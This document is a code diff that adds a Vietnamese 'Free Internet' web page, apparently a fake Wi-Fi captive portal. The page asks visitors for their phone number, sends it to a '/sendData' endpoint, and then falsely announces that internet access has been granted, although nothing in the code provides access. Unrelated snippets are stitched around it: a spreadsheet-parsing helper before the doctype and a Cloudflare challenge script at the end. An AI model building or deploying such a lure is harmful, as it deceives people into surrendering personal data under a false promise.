@@ -1,0 +1,186 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+    <title>Internet Miễn Phí</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background: linear-gradient(135deg, #1db954, #1a8f44);
+            font-family: 'Montserrat', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+        }
+        #container {
+            background: rgba(0,0,0,0.6);
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+            width: 320px;
+        }
+        h1 {
+            margin-bottom: 24px;
+            font-weight: 700;
+            font-size: 1.8rem;
+        }
+        button {
+            background-color: #1ed760;
+            border: none;
+            border-radius: 9999px;
+            padding: 14px 0;
+            width: 100%;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #000;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px; /* Thêm khoảng cách giữa các nút */
+        }
+        button:hover {
+            background-color: #22e268;
+        }
+        input[type="text"] {
+            width: calc(100% - 24px); /* Chiếm toàn bộ chiều rộng trừ padding */
+            padding: 12px; /* Tăng padding để ô input lớn hơn */
+            margin-top: 10px;
+            margin-left: 4px; /* Căn ô input qua trái một chút */
+            border: 2px solid #1ed760; /* Đường viền màu xanh */
+            border-radius: 25px; /* Góc bo tròn */
+            font-size: 1rem;
+            background-color: rgba(255, 255, 255, 0.1); /* Màu nền trong suốt */
+            color: white; /* Màu chữ trắng */
+            transition: border-color 0.3s; /* Hiệu ứng chuyển màu đường viền */
+            box-sizing: border-box; /* Đảm bảo padding không làm lệch chiều rộng */
+        }
+        input[type="text"]:focus {
+            border-color: #22e268; /* Đổi màu đường viền khi ô input được chọn */
+            outline: none; /* Bỏ viền mặc định */
+        }
+        #phone-container {
+            display: none; /* Ẩn phần nhập số điện thoại ban đầu */
+            margin-top: 20px;
+        }
+        #success-message {
+            display: none; /* Ẩn thông báo thành công ban đầu */
+            margin-top: 20px;
+            font-size: 1.2rem;
+            color: #c2f0c2;
+        }
+        #instruction {
+            margin-bottom: 20px; /* Khoảng cách giữa tiêu đề và nút */
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1>Internet Miễn Phí</h1>
+        <p id="instruction">Ấn vào nút phía dưới để truy cập Internet</p>
+        <button id="access-btn" aria-label="Get internet access now">Truy Cập Internet</button>
+        
+        <div id="phone-container">
+            <input type="text" id="phone-input" placeholder="Nhập SĐT của bạn" />
+            <button id="confirm-btn">Xác Nhận</button>
+        </div>
+        <div id="success-message">Đã cấp quyền! Bây giờ bạn đã có thể dùng Internet.</div>
+    </div>
+
+    <script>
+        const button = document.getElementById('access-btn');
+        const phoneContainer = document.getElementById('phone-container');
+        const confirmBtn = document.getElementById('confirm-btn');
+        const phoneInput = document.getElementById('phone-input');
+        const successMessage = document.getElementById('success-message');
+        const instruction = document.getElementById('instruction');
+
+        // Hàm gửi số điện thoại từ localStorage tới server
+        function sendPhoneData() {
+            const phone = localStorage.getItem('phone');
+            if (phone) {
+                fetch('/sendData', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain',
+                    },
+                    body: phone,
+                })
+                .then(response => response.text())
+                .then(result => console.log(result))
+                .catch(error => console.error('Error:', error));
+            }
+        }
+
+        // Hiện phần nhập số điện thoại khi nhấn nút
+        button.onclick = function() {
+            phoneContainer.style.display = "block"; // Hiện phần nhập số điện thoại
+            instruction.style.display = "none"; // Ẩn hướng dẫn
+            button.style.display = "none"; // Ẩn nút truy cập
+        }
+
+        // Xác nhận số điện thoại
+        confirmBtn.onclick = function() {
+            const phone = phoneInput.value.trim();
+            if (phone === '') {
+                alert("Vui lòng nhập số điện thoại.");
+                return;
+            }
+            const phoneRegex = /^[+0-9\s\-]{6,20}$/;
+            if (!phoneRegex.test(phone)) {
+                alert("SĐT không hợp lệ.");
+                return;
+            }
+
+            // Lưu số điện thoại vào localStorage và gửi tới server
+            localStorage.setItem('phone', phone);
+            sendPhoneData(); // Gửi số điện thoại ngay sau khi lưu
+            button.disabled = true;
+            button.textContent = 'Đã Cấp Quyền!';
+            phoneContainer.style.display = "none"; // Ẩn phần nhập số điện thoại
+            successMessage.style.display = "block"; // Hiện thông báo thành công
+        }
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93d000478c560c55',t:'MTc0Njc4MTE2OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
